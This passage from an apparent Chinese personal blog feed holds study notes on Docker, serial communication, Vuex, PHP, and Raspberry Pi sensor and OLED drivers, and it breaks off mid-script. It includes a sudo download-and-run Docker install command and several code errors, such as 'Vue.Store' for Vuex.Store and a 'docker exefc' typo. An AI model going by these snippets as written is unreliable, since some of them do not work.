  <entry>
    <title>Docker 学习笔记</title>
    <link href="/2020/10/19/Docker/"/>
    <url>/2020/10/19/Docker/</url>
    
    <content type="html"><![CDATA[<h3 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker 安装"></a>Docker 安装</h3><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p><a id="more"></a><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低</p><ol><li><p>脚本安装（推荐）</p><pre><code class="hljs bash">curl -fsSL https://get.docker.com -o get-docker.shsudo sh get-docker.sh</code></pre></li><li><p>Centos 安装</p><pre><code class="hljs bash">sudo yum install docker-ce docker-ce-cli containerd.io</code></pre></li><li><p>Ubuntu安装</p><pre><code class="hljs bash">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<span class="hljs-comment">#导入密钥</span>sudo add-apt-repository \   <span class="hljs-string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span><span class="hljs-string">   <span class="hljs-subst">$(lsb_release -cs)</span> \</span><span class="hljs-string">   stable&quot;</span><span class="hljs-comment">#添加源地址</span>sudo apt-get update<span class="hljs-comment">#更新</span>sudo apt-get install docker-ce docker-ce-cli containerd.io<span class="hljs-comment">#安装Docker</span></code></pre><p>其他发行版就不写了，感觉用不到的啦</p><p><strong>输入命令 docker -v 查看版本号，出现版本号即安装成功</strong><img src="/2020/10/19/Docker/image-20201019144729867.png" alt="image-20201019144729867"></p></li></ol><h3 id="基本命令和用法"><a href="#基本命令和用法" class="headerlink" title="基本命令和用法"></a>基本命令和用法</h3><ol><li><code>docker search</code>：从dockerhub上搜索镜像的名字 （docker search -s 30 ubuntu –no-trunc ）</li></ol><blockquote><p>选项： -s 30 ：筛选星标30 –no-trunc ： 显示所有信息<br>2. <code>docker pull</code> 下载镜像<br>3. <code>docker rmi</code>删除镜像<br>4. <code>docker rm</code> 删除容器<br>5. <code>docker images</code> 查看下载的镜像<br>6. <code>docker ps </code>查看运行中的容器</p></blockquote><h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><ol><li><p>新建并运行容器</p><p><code>docker run -d --name 容器名 -v 宿主机文件路径:容器路径 -p 宿主机端口:容器端口 镜像名:版本号</code></p><blockquote><ol><li><p>本地镜像不存在则会执行<code>docker pull 镜像</code></p></li><li><p><code>-d</code>为后台运行模式 可选<code>-it</code> 参数 为容器分配一个伪终端，输入<code>exit</code>后会关闭容器，也可以用<code>Ctrl+P+Q</code>：不关闭容器，退出，<code>--restart=always</code>运行容器时添加启动策略，加入<code>-it</code>参数后<code>exit</code>也不会退出容器</p></li><li><p>进入正在运行的容器</p><p><code>docker attach 容器ID</code> 进入容器，exit后会关闭容器<br><code>docker exec 容器ID</code> 进入容器 或 （不进去）执行一个任务 <strong>很重要！</strong><br>eg:<br><code>docker exec -it 容器ID /bin/bash</code> //进入主机<br><code>docker exefc ID ls</code> //不进入，执行<code>ls</code>命令</p><blockquote><p>容器ID也可用容器名替换</p></blockquote></li><li><p>启动一个被关闭的容器: <code>docker start +id</code> (ps查id)</p></li><li><p>停止容器： <code>docker stop 容器ID //温柔</code> <code>docker kill 容器ID//拔掉电源</code></p></li><li><p>删除已停止的容器 <code>docker rm 容器ID</code>删除正在运行的镜像先<code>docker stop 容器ID</code></p></li><li><p>查看容器日志 <code>docker logs -f -t --tail 容器ID</code> （-t加入时间戳 -f 刷新日志）<br>查看容器内部进程 <code>docker top 容器ID</code></p></li><li><p><code>docker cp 容器ID：/tmp/a.log /root</code> //把a.log 拷贝到主机/root下</p></li></ol></blockquote></li></ol><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><ol><li>特点：一种轻量级，可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件。包括代码，云从事，库，环境变量，配置文件。<br><strong>UnionsFS联合文件系统</strong>：一种分层，轻量级的文件系统。对文件系统的修改作为一次提交层层叠加。是docker分层继承的基础斜体样式。</li><li><strong>Docker加载原理</strong>：bootfs+rootfs。</li></ol><ul><li><strong>bootfs</strong> ：包括最基本命令，工具，程序库（内核来自宿主机） ;</li><li><strong>rootfs</strong> ：控制Centos,Ubntu等发行版本。</li></ul><blockquote><p>思考 ：Centos与Ubntu的Linux版本中，bootfs是否相同？<br>——相同<br>UnionsFS联合文件系统的优点？<br>—— 复用，共享资源。</p></blockquote><ol><li>对镜像的操作<ol><li><code>docker commit</code> 提交容器副本，保存修改过后的容器，成为一个新的镜像 .<br>当我们run一个容器后，对容器内容进行了修改时，可以保存此容器，作为一个新的镜像。<br><code>docker commit -m=&quot;描述&quot; -a=&quot;作者&quot; 容器ID 目标镜像名字：[标签名]</code></li></ol></li></ol><h3 id="Dockerfile初识"><a href="#Dockerfile初识" class="headerlink" title="Dockerfile初识"></a>Dockerfile初识</h3><h5 id="先认识以下几个关键字："><a href="#先认识以下几个关键字：" class="headerlink" title="先认识以下几个关键字："></a>先认识以下几个关键字：</h5><p><strong>From</strong> ：基于**创建</p><p><strong>ENV</strong>: 配置环境</p><p><strong>EXPOSE</strong> ：暴露端口</p><p><strong>CMD</strong> ：启动</p><h5 id="再来了解一个概念——容器卷："><a href="#再来了解一个概念——容器卷：" class="headerlink" title="再来了解一个概念——容器卷："></a>再来了解一个概念——容器卷：</h5><p>保存容器中数据，数据持久化。容器之间，主机与容器之间，共享数据。<strong>相当于挂载！可以使得主机与容器内同步更新！</strong></p><p><strong>容器卷的两种使用方式：</strong><br>1.使用命令，在创建镜像时直接添加容器卷。直接举例说明：<br><code>docker run -it -v /主机绝对路径：/容器内目录 镜像名</code><br><code>docker run -it -v /主机绝对路径：/容器内目录：ro 镜像名</code> 只读</p><p>2.在dockerfile中编写，使用<strong>VOLUME</strong>指令<br><code>VOLUME[&quot;/file1&quot;,&quot;/file2&quot;,&quot;/file3&quot;]</code>//只支持容器内的目录，不支持宿主机目录（为了可移植性）</p><p><code>docker inspect ID</code> //查看挂载在主机的目录</p><p><strong>容器间传递共享：</strong><br><code>docekr run --volumes-from 容器名 镜像名</code></p><pre><code class="hljs bash">eg: docker run  -it --name dc02 --volumes-from dc01 zxd/centos              //dc02  与dc01 共享文件！！//思考：当dc01被<span class="hljs-built_in">kill</span> ，文件是否还存在？——存在，且共享均保持</code></pre>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
      <tag>Container</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>串口通信</title>
    <link href="/2020/10/13/%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/"/>
    <url>/2020/10/13/%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/</url>
    
    <content type="html"><![CDATA[<h3 id="UART"><a href="#UART" class="headerlink" title="UART"></a>UART</h3><p>通用异步收发传输器（Universal Asynchronous Receiver/Transmitter)，通常称作UAR。<a id="more"></a>在嵌入式系统中，通常作为 MCU 的外设； 一般来说，由芯片引脚直接引出的一般是 TTL 电平；而中间接有转换芯片的可能就是 RS232 电平。</p><blockquote><p>COM口、USB口是指的物理接口形式(硬件)。而TTL、RS-232、RS-485是指的电平标准(电信号)。</p></blockquote><img src="/2020/10/13/%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/1.jpg" class title="图片"><p><code>PC端COM物理接口</code></p><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>在单片机中UART可以说是一种最基本的配置，很多与电脑进行通信的设备都采用到它，按计算机最常规的说法就是串行通信。</p><ul><li>TX - 数据发送接口</li><li>RX - 数据接受接口</li></ul><p>两个设备间将TX与RX相连，RX与TX相连即可正常工作。最常用到的就是我们电脑上的USB那就是个最典型的UART接口。</p><img src="/2020/10/13/%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/7.png" class title="图片"><h3 id="数据检验"><a href="#数据检验" class="headerlink" title="数据检验"></a>数据检验</h3><img src="/2020/10/13/%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/4.png" class title="图片"><h3 id="TTL"><a href="#TTL" class="headerlink" title="TTL"></a>TTL</h3><p>TTL 电平是 TTL 电路输出的电平，其中”TTL”是英文 “Transistor-Transistor Logic” 的缩写，中文翻译为“晶体管－晶体管逻辑”，因此 TTL 电路就是“晶体管－晶体管逻辑电路”。<br> 由于电平是一个连续变化的电压范围，为了用这种模拟量的电压来表示数字量的逻辑1和逻辑0，TTL电平规定：</p><ul><li><p>输出电路：电压大于等于（≥）2.4V为逻辑1；电压小于等于（≤）0.4V为逻辑0；</p></li><li><p>输入电路：电压大于等于（≥）2.0V为逻辑1；电压小于等于（≤）0.8V为逻辑0；</p><img src="/2020/10/13/%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/5.png" class title="图片"></li></ul><h3 id="RS232"><a href="#RS232" class="headerlink" title="RS232"></a>RS232</h3><p>RS232 是美国电子工业协会于 1962 年发布的串行通信接口标准，其中 RS 为英文 “Recomend Standard” 的缩写，中文翻译为“推荐标准”，232为标识号。该标准对串行通信的物理接口及逻辑电平都做了规定。其输出的电平称为 RS232 电平。</p><p>最简单的RS232通信由三条数据线组成，即 TxD、RxD 和GND。RS232采用负逻辑电平，即-15V ~ -3V代表逻辑”1”，+3V ~ +15V代表逻辑”0”。这里的电平，是TxD线（或者RxD线）相对于 GND 的电压。</p><img src="/2020/10/13/%E4%B8%B2%E5%8F%A3%E9%80%9A%E4%BF%A1/6.png" class title="图片"><h3 id="资料阅读"><a href="#资料阅读" class="headerlink" title="资料阅读"></a>资料阅读</h3><p><a href="https://zhuanlan.zhihu.com/p/89240672">知乎</a></p><p><a href="https://www.jianshu.com/p/df2ed057b4a0">简书</a></p><p><a href="https://www.youtube.com/watch?v=ZzRXKDkMBhA">YouTube</a></p>]]></content>
    
    
    <categories>
      
      <category>串口通信</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UART</tag>
      
      <tag>RS-232</tag>
      
      <tag>TTL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vuex 笔记</title>
    <link href="/2020/10/09/vuex-%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/10/09/vuex-%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="VUEX-概述"><a href="#VUEX-概述" class="headerlink" title="VUEX 概述"></a>VUEX 概述</h3><ol><li><p>Vuex是什么</p><p>Vuex 是实现组件全局状态（数据）管理的一种机制，可以方便组件之间数据共享。</p><a id="more"></a></li><li><p>Vuex统一管理状态好处</p><ol><li>能够在vuex中集中管理数据，易于开发和后期维护。</li><li>能够高效地实现组件之间的数据共享，提高开发效率。</li><li>存储在vuex中的数据是响应式的，能够实时保持数据与页面同步</li></ol></li><li><p>适合存储在vuex中的数据</p><blockquote><p>组件之间共享的数据</p></blockquote></li></ol><h3 id="Vuex安装与使用"><a href="#Vuex安装与使用" class="headerlink" title="Vuex安装与使用"></a>Vuex安装与使用</h3><ol><li>安装vuex依赖包</li></ol><pre><code class="hljs sh">npm install vuex --save</code></pre><ol start="2"><li>导入Vuex包</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">import</span> Vuex from <span class="hljs-string">&#x27;vuex&#x27;</span>Vue.use(Vuex)</code></pre><ol start="3"><li>创建store对象</li></ol><pre><code class="hljs Java"><span class="hljs-keyword">const</span> store = <span class="hljs-keyword">new</span> Vue.Store(&#123;    state: &#123;count: <span class="hljs-number">0</span>&#125; <span class="hljs-comment">//state 存放的全局共享的数据</span>&#125;)</code></pre>]]></content>
    
    
    <categories>
      
      <category>web前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
      <tag>vuex</tag>
      
      <tag>web前端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP 笔记</title>
    <link href="/2020/10/03/PHP-%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/10/03/PHP-%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="PHP基本语法"><a href="#PHP基本语法" class="headerlink" title="PHP基本语法"></a>PHP基本语法</h3><ol><li><p>PHP代码一般嵌入到HTML文档中，通过“<?php“和“?>”标记分隔PHP代码。 </p><a id="more"></a><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#这里是PHP代码</span><span class="hljs-meta">?&gt;</span></code></pre><p>或者通过脚本标签包含PHP代码</p><pre><code class="hljs js">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;#php代码&lt;/script&gt;</code></pre><ol start="2"><li>注释</li></ol></li></ol><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#Shell 风格</span><span class="hljs-comment">// 单行注释</span><span class="hljs-comment">/*</span><span class="hljs-comment">  多行注释</span><span class="hljs-comment">  多行注释</span><span class="hljs-comment">*/</span><span class="hljs-meta">?&gt;</span></code></pre><blockquote><p>注意注释不要包含?&gt;,服务器会误判PHP代码结束</p></blockquote><ol start="3"><li><ol><li>整型进制表示方法<img src="/2020/10/03/PHP-%E7%AC%94%E8%AE%B0/Snipaste_2020-10-03_21-34-33.png" style="zoom:67%;"></li><li>浮点型表示方法<img src="/2020/10/03/PHP-%E7%AC%94%E8%AE%B0/Snipaste_2020-10-03_22-48-12.png" style="zoom:50%;"></li></ol></li><li><p>Heredoc结构<img src="/2020/10/03/PHP-%E7%AC%94%E8%AE%B0/Snipaste_2020-10-03_23-02-27.png" style="zoom:50%;"></p></li><li><p>引用、静态变量及全局变量</p><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>    $str1=<span class="hljs-string">&quot;hello&quot;</span>;    $str2=$str1;<span class="hljs-comment">//变量赋值</span>    $str2=&amp; $str1;<span class="hljs-comment">//引用赋值</span>    <span class="hljs-built_in">static</span> $name=<span class="hljs-string">&#x27;C#&#x27;</span>;<span class="hljs-comment">//静态变量</span>    $score=<span class="hljs-number">80</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span>&#123;       $score=<span class="hljs-number">100</span>;       <span class="hljs-keyword">echo</span> $score.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="hljs-comment">//输出100</span>       <span class="hljs-keyword">global</span> $score;<span class="hljs-comment">//定义全局变量</span>       <span class="hljs-keyword">echo</span> $score;<span class="hljs-comment">//输出80</span>    &#125;    f();<span class="hljs-comment">//调用函数</span><span class="hljs-meta">?&gt;</span></code></pre></li></ol><ol start="6"><li>可变变量<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>    $name=<span class="hljs-string">&#x27;wit&#x27;</span>;    $wit=<span class="hljs-string">&#x27;hello,word&#x27;</span>;    <span class="hljs-keyword">echo</span> $name.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="hljs-comment">//输出wit</span>    <span class="hljs-keyword">echo</span> $$name;<span class="hljs-comment">//输出hello,word</span><span class="hljs-meta">?&gt;</span></code></pre></li></ol><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><ol><li><p>定义常量，语法：</p><pre><code class="hljs PHP">define(<span class="hljs-keyword">string</span> constant_name,mixed_value,case_sensitive=<span class="hljs-literal">true</span>);</code></pre><p>说明：第一个参数为常量名，第二个参数为常量值，第三个参数表示是否对大小写敏感(可选)。</p></li><li><p>获取常量的值，语法：</p><pre><code class="hljs PHP">mixed constant(<span class="hljs-keyword">string</span> const_name);</code></pre><p>也可以通过常量名直接获取常量的值.</p></li><li><p>判断一个常量是否定义，语法：</p><pre><code class="hljs PHP"><span class="hljs-keyword">bool</span> defined(<span class="hljs-keyword">string</span> const_name);</code></pre><blockquote><p>示例</p></blockquote></li></ol><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>    define(<span class="hljs-string">&quot;PI&quot;</span>, <span class="hljs-number">3.14159</span>);    <span class="hljs-keyword">if</span>(defined(<span class="hljs-string">&quot;PI&quot;</span>))    &#123;       <span class="hljs-keyword">echo</span> PI,<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<span class="hljs-comment">//</span>       <span class="hljs-keyword">echo</span> constant(<span class="hljs-string">&quot;PI&quot;</span>);    &#125;<span class="hljs-meta">?&gt;</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RaspBerry pi 驱动温湿度传感器DHT11</title>
    <link href="/2020/10/03/RaspBerry-pi-%E9%A9%B1%E5%8A%A8%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8aht11/"/>
    <url>/2020/10/03/RaspBerry-pi-%E9%A9%B1%E5%8A%A8%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8aht11/</url>
    
    <content type="html"><![CDATA[<h3 id="一、接线"><a href="#一、接线" class="headerlink" title="一、接线"></a>一、接线</h3><p>树莓派       DHT11<br>3.3V   –&gt;   VCC<br>GPIO4  –&gt;   DTA<br>GND    –&gt;   GND</p><a id="more"></a><h3 id="二、安装Python库"><a href="#二、安装Python库" class="headerlink" title="二、安装Python库"></a>二、安装Python库</h3><pre><code class="hljs bash">sudo pip3 install Adafruit_DHT</code></pre><h3 id="三、Python程序读取温度"><a href="#三、Python程序读取温度" class="headerlink" title="三、Python程序读取温度"></a>三、Python程序读取温度</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> Adafruit_DHT<span class="hljs-keyword">import</span> timehumidity, temperature = Adafruit_DHT.read_retry(Adafruit_DHT.DHT11, <span class="hljs-number">4</span>) <span class="hljs-comment">#GPIO 4</span><span class="hljs-keyword">while</span> <span class="hljs-number">1</span> :    <span class="hljs-keyword">if</span> humidity <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> temperature <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:        print(<span class="hljs-string">&#x27;Temp=&#123;0:0.1f&#125;*  Humidity=&#123;1:0.1f&#125;%&#x27;</span>.format(temperature, humidity))    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&#x27;Failed to get reading. Try again!&#x27;</span>)</code></pre><h3 id="四、C语言版"><a href="#四、C语言版" class="headerlink" title="四、C语言版"></a>四、C语言版</h3><ol><li>安装wiringPi</li></ol><pre><code class="hljs sh"><span class="hljs-comment">#下载 wiringPi</span>git <span class="hljs-built_in">clone</span> https://github.com/WiringPi/WiringPi<span class="hljs-comment">#编译 wiringPi</span><span class="hljs-built_in">cd</span> WiringPisudo ./build</code></pre><ol start="2"><li>C文件</li></ol><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wiringPi.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span> <span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> uint8;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>  uint16;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> uint32; <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> HIGH_TIME 32</span> <span class="hljs-keyword">int</span> pinNumber = <span class="hljs-number">7</span>; <span class="hljs-comment">// pin7</span>uint32 databuf;  <span class="hljs-function">uint8 <span class="hljs-title">readSensorData</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    uint8 crc;     uint8 i;      pinMode(pinNumber, OUTPUT); <span class="hljs-comment">// set mode to output</span>    digitalWrite(pinNumber, <span class="hljs-number">0</span>); <span class="hljs-comment">// output a high level </span>    delay(<span class="hljs-number">25</span>);    digitalWrite(pinNumber, <span class="hljs-number">1</span>); <span class="hljs-comment">// output a low level </span>    pinMode(pinNumber, INPUT); <span class="hljs-comment">// set mode to input</span>    pullUpDnControl(pinNumber, PUD_UP);     delayMicroseconds(<span class="hljs-number">27</span>);    <span class="hljs-keyword">if</span> (digitalRead(pinNumber) == <span class="hljs-number">0</span>) <span class="hljs-comment">//SENSOR ANS</span>    &#123;        <span class="hljs-keyword">while</span> (!digitalRead(pinNumber))            ; <span class="hljs-comment">//wait to high</span>         <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++)        &#123;            <span class="hljs-keyword">while</span> (digitalRead(pinNumber))                ; <span class="hljs-comment">//data clock start</span>            <span class="hljs-keyword">while</span> (!digitalRead(pinNumber))                ; <span class="hljs-comment">//data start</span>            delayMicroseconds(HIGH_TIME);            databuf *= <span class="hljs-number">2</span>;            <span class="hljs-keyword">if</span> (digitalRead(pinNumber) == <span class="hljs-number">1</span>) <span class="hljs-comment">//1</span>            &#123;                databuf++;            &#125;        &#125;         <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)        &#123;            <span class="hljs-keyword">while</span> (digitalRead(pinNumber))                ; <span class="hljs-comment">//data clock start</span>            <span class="hljs-keyword">while</span> (!digitalRead(pinNumber))                ; <span class="hljs-comment">//data start</span>            delayMicroseconds(HIGH_TIME);            crc *= <span class="hljs-number">2</span>;              <span class="hljs-keyword">if</span> (digitalRead(pinNumber) == <span class="hljs-number">1</span>) <span class="hljs-comment">//1</span>            &#123;                crc++;            &#125;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">else</span>    &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;    &#125;&#125;  <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;PIN:%d\n&quot;</span>, pinNumber);     <span class="hljs-keyword">if</span> (<span class="hljs-number">-1</span> == wiringPiSetup()) &#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Setup wiringPi failed!&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;      pinMode(pinNumber, OUTPUT); <span class="hljs-comment">// set mode to output</span>    digitalWrite(pinNumber, <span class="hljs-number">1</span>); <span class="hljs-comment">// output a high level </span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Starting...\n&quot;</span>);    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)     &#123;        pinMode(pinNumber, OUTPUT); <span class="hljs-comment">// set mode to output</span>        digitalWrite(pinNumber, <span class="hljs-number">1</span>); <span class="hljs-comment">// output a high level </span>        delay(<span class="hljs-number">3000</span>);        <span class="hljs-keyword">if</span> (readSensorData())        &#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sensor data read ok!\n&quot;</span>);            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RH:%d.%d\n&quot;</span>, (databuf &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span>, (databuf &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span>);             <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;TMP:%d.%d\n&quot;</span>, (databuf &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>, databuf &amp; <span class="hljs-number">0xff</span>);            databuf = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-keyword">else</span>        &#123;            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sensor dosent ans!\n&quot;</span>);            databuf = <span class="hljs-number">0</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><ol start="3"><li>编译运行C文件</li></ol><pre><code class="hljs sh">gcc -Wall -o dht11 dht11.c -lwiringPisudo ./dht11</code></pre>]]></content>
    
    
    <categories>
      
      <category>树莓派</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树莓派</tag>
      
      <tag>RaspBerry</tag>
      
      <tag>dht11</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RaspBerry pi 驱动oled12864 </title>
    <link href="/2020/10/03/RaspBerry-pi-%E9%A9%B1%E5%8A%A8oled12864/"/>
    <url>/2020/10/03/RaspBerry-pi-%E9%A9%B1%E5%8A%A8oled12864/</url>
    
    <content type="html"><![CDATA[<h3 id="一、材料准备"><a href="#一、材料准备" class="headerlink" title="一、材料准备"></a>一、材料准备</h3><ul><li>树莓派4b，安装rasbian系统的内存卡，支持IIC协议的OLED屏幕，杜邦线<a id="more"></a><h3 id="二、接线"><a href="#二、接线" class="headerlink" title="二、接线"></a>二、接线</h3>树莓派                  oled<br>3.3v        –&gt;        VCC (VDD)<br>GPIO2(SDL)  –&gt;        SDL(SDA)<br>GPIO3(SCL)  –&gt;        SCL(SCK)<br>GND         –&gt;         GND</li></ul><hr> <img src="/2020/10/03/RaspBerry-pi-%E9%A9%B1%E5%8A%A8oled12864/1.jpg" class title="slug 图片"><h3 id="三、关于I2C-IIC-协议"><a href="#三、关于I2C-IIC-协议" class="headerlink" title="三、关于I2C(IIC)协议"></a>三、关于I2C(IIC)协议</h3><p><a href="https://bbs.elecfans.com/jishu_1120014_1_1.html">IIC协议与OLED的使用</a></p><h3 id="四、驱动OLED"><a href="#四、驱动OLED" class="headerlink" title="四、驱动OLED"></a>四、驱动OLED</h3><ol><li>安装Adafruit库<pre><code class="hljs bash">sudo pip3 install adafruit-circuitpython-ssd1306</code></pre></li><li>使用examples<pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/adafruit/Adafruit_CircuitPython_SSD1306</code></pre></li><li>显示各种信息<br>例一、<pre><code class="hljs python"><span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> subprocess<span class="hljs-keyword">import</span> datetime<span class="hljs-keyword">from</span> board <span class="hljs-keyword">import</span> SCL, SDA<span class="hljs-keyword">import</span> busio<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageDraw, ImageFont<span class="hljs-keyword">import</span> adafruit_ssd1306i2c = busio.I2C(SCL, SDA)disp = adafruit_ssd1306.SSD1306_I2C(<span class="hljs-number">128</span>, <span class="hljs-number">64</span>, i2c)disp.fill(<span class="hljs-number">0</span>)disp.show()width = disp.widthheight = disp.heightimage = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height))draw = ImageDraw.Draw(image)draw.rectangle((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), outline=<span class="hljs-number">0</span>, fill=<span class="hljs-number">0</span>)padding = <span class="hljs-number">-2</span>top = paddingbottom = height - paddingfont1 = ImageFont.load_default()font = ImageFont.truetype(<span class="hljs-string">&quot;/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf&quot;</span>, <span class="hljs-number">9</span>)font2 = ImageFont.truetype(<span class="hljs-string">&quot;/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf&quot;</span>, <span class="hljs-number">14</span>)font3 = ImageFont.truetype(<span class="hljs-string">&quot;/usr/share/fonts/truetype/wqy/wqy-zenhei.ttc&quot;</span>, <span class="hljs-number">22</span>)<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    draw.rectangle((<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), outline=<span class="hljs-number">0</span>, fill=<span class="hljs-number">0</span>)    cmd = <span class="hljs-string">&quot;hostname -I | cut -d&#x27; &#x27; -f1&quot;</span>    IP = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)    cmd = <span class="hljs-string">&quot;top -bn1 | grep load | awk &#x27;&#123;printf \&quot;CPU Load: %.2f\&quot;, $(NF-2)&#125;&#x27;&quot;</span>    CPU = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)    cmd = <span class="hljs-string">&quot;free -m | awk &#x27;NR==2&#123;printf \&quot;Mem: %s/%s MB %.2f%%\&quot;, $3,$2,$3*100/$2 &#125;&#x27;&quot;</span>    MemUsage = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)    cmd = <span class="hljs-string">&#x27;df -h | awk \&#x27;$NF==&quot;/&quot;&#123;printf &quot;Disk: %d/%d GB  %s&quot;, $3,$2,$5&#125;\&#x27;&#x27;</span>    Disk = subprocess.check_output(cmd, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)    draw.text((x, top + <span class="hljs-number">0</span>), <span class="hljs-string">&quot;IP: &quot;</span> + IP, font=font, fill=<span class="hljs-number">255</span>)    draw.text((x, top + <span class="hljs-number">8</span>), CPU, font=font, fill=<span class="hljs-number">255</span>)    draw.text((x, top + <span class="hljs-number">16</span>), MemUsage, font=font, fill=<span class="hljs-number">255</span>)    draw.text((x, top + <span class="hljs-number">25</span>), Disk, font=font, fill=<span class="hljs-number">255</span>)<span class="hljs-comment">#    intro = 